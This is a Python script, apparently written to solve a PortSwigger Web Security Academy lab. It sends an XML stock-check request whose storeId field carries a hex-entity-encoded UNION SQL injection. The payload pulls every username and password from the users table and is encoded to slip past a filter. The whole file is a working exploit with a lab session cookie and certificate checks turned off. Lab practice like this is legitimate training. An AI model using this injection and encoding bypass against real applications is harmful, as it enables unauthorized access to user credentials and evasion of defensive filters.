#!/usr/bin/env python3
"""
PortSwigger lab - SQLi via XML with Hackvertor hex_entities bypass
"""
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET   = "https://0a8000a4049fb51180d53f0c0057008a.web-security-academy.net/"
ENDPOINT = "/product/stock"
SESSION  = "n8BrRpLgMz3kSVcaES4axJmCQxLRkmDo"

# --- Hackvertor encoders ---------------------------------------------------
def hex_entities(s: str) -> str:
    """Equivalent of Hackvertor's <@hex_entities>...<@/hex_entities>.
    Encodes each char as &#x<hex>; (lowercase, no zero-padding)."""
    return "".join(f"&#x{ord(c):x};" for c in s)

def dec_entities(s: str) -> str:
    """Bonus: <@dec_entities> equivalent."""
    return "".join(f"&#{ord(c)};" for c in s)

# --- Payload ---------------------------------------------------------------
sqli = "1 UNION SELECT username || '~' || password FROM users"
encoded = hex_entities(sqli)

xml_body = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<stockCheck>'
        '<productId>1</productId>'
        f'<storeId>{encoded}</storeId>'
    '</stockCheck>'
)

headers = {
    "Cookie":            f"session={SESSION}",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Accept-Language":    "en-US,en;q=0.9",
    "Sec-Ch-Ua":          '"Not-A.Brand";v="24", "Chromium";v="146"',
    "Content-Type":       "application/xml",
    "Sec-Ch-Ua-Mobile":   "?0",
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/146.0.0.0 Safari/537.36"),
    "Accept":         "*/*",
    "Origin":         TARGET,
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer":        f"{TARGET}/product?productId=1",
}

# --- Send ------------------------------------------------------------------
print("[*] Encoded payload:")
print(f"    {encoded}\n")
print("[*] Final XML body:")
print(f"    {xml_body}\n")

r = requests.post(
    TARGET + ENDPOINT,
    headers=headers,
    data=xml_body,
    verify=False,
    timeout=15,
)

print(f"[+] Status : {r.status_code}")
print(f"[+] Length : {len(r.text)}")
print("[+] Body   :")
print(r.text)